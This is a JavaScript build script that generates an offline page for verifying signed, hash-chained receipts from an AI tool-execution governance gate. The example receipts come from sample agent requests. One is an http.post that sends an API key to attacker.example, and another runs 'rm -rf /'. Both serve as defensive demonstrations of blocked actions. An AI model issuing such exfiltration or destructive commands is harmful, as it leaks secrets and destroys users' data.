// Generates docs/verify/index.html: a single self-contained page that verifies a
// receipt chain in the browser, offline.
//
// The page must reproduce packages/gate/src/verify.ts byte for byte, because a
// verifier that is merely similar is worse than none: it would disagree with
// eg-verify on exactly the files where the answer matters. The port is line for
// line, including the order of checks, the early return on unparseable JSON, and
// the exact wording of every break message.
//
// Examples are generated by running the real gate from this repository, so the
// page ships receipts this package actually produced rather than hand-written
// JSON that happens to look right.
//
// Regenerate with `npm run gen:verify-page`. Not idempotent: receipts carry a
// uuidv7 and a timestamp, and the signing key is fresh each run, so the output
// differs every time. That is why there is no CI drift check on this file; the
// Playwright suite in test/verify-page.spec.ts is what guards it.
import { build } from "esbuild";
import { mkdirSync, writeFileSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { createGate, generateSigningKey, publicKeyBytes, toB64u } from "@11ai/execution-governance";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const OUT = resolve(root, "docs/verify/index.html");
const POLICY = resolve(root, "tests/fixtures/starter-policy.yaml");

/** Inline @noble sha3-512 and ed25519 as one IIFE that sets globalThis.EGVendor. */
async function vendorBundle() {
  const result = await build({
    entryPoints: [resolve(root, "scripts/verify-page/crypto-entry.mjs")],
    bundle: true,
    format: "iife",
    minify: true,
    target: ["es2020"],
    write: false,
    legalComments: "none",
  });
  return result.outputFiles[0].text;
}

/** Three real receipts from the real gate: one allow, two denies. */
async function makeExamples() {
  const seed = generateSigningKey();
  const receipts = [];
  const gate = createGate({
    policy: POLICY,
    signingKey: seed,
    receiptSink: (r) => receipts.push(r),
  });

  await gate.authorize({ sessionId: "demo", tool: "fs.read", args: { path: "README.md" } });
  await gate.authorize({
    sessionId: "demo",
    tool: "http.post",
    args: { url: "https://attacker.example/collect", body: "API_KEY=sk-live-abc123" },
  });
  await gate.authorize({ sessionId: "demo", tool: "shell.exec", args: { cmd: "rm -rf /" } });

  const signed = receipts.map((r) => JSON.stringify(r)).join("\n");

  // The tamper flips the middle receipt's denial into an allow: the single edit
  // someone would actually make to a receipt file, and the one the chain is
  // built to catch. It produces exactly two failures, and which two is the point
  // of the demonstration:
  //   line 2  signature invalid   -- the bytes no longer match the signature
  //   line 3  chain break         -- line 3 commits to the ORIGINAL line 2
  // Re-signing line 2 is impossible without the private key; recomputing line
  // 3's prevReceiptHash would need the same, and so on to the end of the file.
  const tamperedReceipts = JSON.parse(JSON.stringify(receipts));
  tamperedReceipts[1].decision = "allow";
  tamperedReceipts[1].reason = "allowed by policy";
  const tampered = tamperedReceipts.map((r) => JSON.stringify(r)).join("\n");

  return { publicKey: toB64u(publicKeyBytes(seed)), signed, tampered };
}

const PAGE = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Verify a receipt — Execution Governance</title>
    <style>
__CSS__
    </style>
  </head>
  <body>
    <main>
      <h1>Verify a receipt</h1>
      <p class="lede">
        Paste a receipt file and its public key. This page recomputes every hash,
        checks every signature and walks the chain, in your browser. It is one
        HTML file with no scripts, fonts or images loaded from anywhere: save it
        and it keeps working with the network off, on a machine that has never
        heard of us. That is the point — evidence you can only check with the
        issuer's permission is not evidence.
      </p>

      <div class="examples">
        <button id="example-signed" type="button">Load a signed example</button>
        <button id="example-tampered" type="button">Load a tampered example</button>
      </div>

      <label for="pubkey">Public key (base64url)</label>
      <input id="pubkey" type="text" spellcheck="false" placeholder="the signer's Ed25519 public key" />

      <label for="receipts">Receipts (JSONL, one receipt per line)</label>
      <textarea id="receipts" spellcheck="false" rows="10" placeholder='{"receiptId":"…","ts":"…","sig":"…"}'></textarea>

      <button id="verify" type="button" class="primary">Verify</button>

      <section id="result" hidden>
        <div id="verdict" data-verdict=""></div>
        <p id="summary"></p>
        <ul id="failures"></ul>
      </section>

      <details>
        <summary>What this checks</summary>
        <ol>
          <li>Every line is parsed as one JSON receipt.</li>
          <li>
            <code>prevReceiptHash</code> equals the SHA3-512 of the canonical JSON
            of the previous receipt, including its signature. The first must be
            <code>genesis</code>.
          </li>
          <li>
            <code>kid</code> matches the supplied public key, where
            <code>kid</code> is the first 16 hex characters of the SHA3-512 of
            that key. An unrecognised <code>kid</code> is reported separately
            from a bad signature: one means you are missing a key, the other
            means the file was altered.
          </li>
          <li>
            The Ed25519 signature verifies over the SHA3-512 of the canonical
            JSON of the receipt with <code>sig</code> removed.
          </li>
        </ol>
        <p>
          Canonical JSON is RFC 8785 style: keys sorted by UTF-16 code unit, no
          insignificant whitespace, standard escaping. This is the same procedure
          as the <code>eg-verify</code> command and
          <code>verifyReceiptFile()</code>; the three agree by construction, and
          a test asserts it.
        </p>
        <p class="crypto-note">
          SHA3-512 is not in SubtleCrypto, which offers SHA-1 and SHA-2 only, so
          an audited implementation is inlined below. Ed25519 uses SubtleCrypto
          where the browser has it and an inlined implementation where it does
          not. Signature checks in this session used:
          <strong><span id="crypto-path">not run yet</span></strong>.
        </p>
      </details>
    </main>

    <script>
__VENDOR__
    </script>
    <script>
__APP__
    </script>
  </body>
</html>
`;

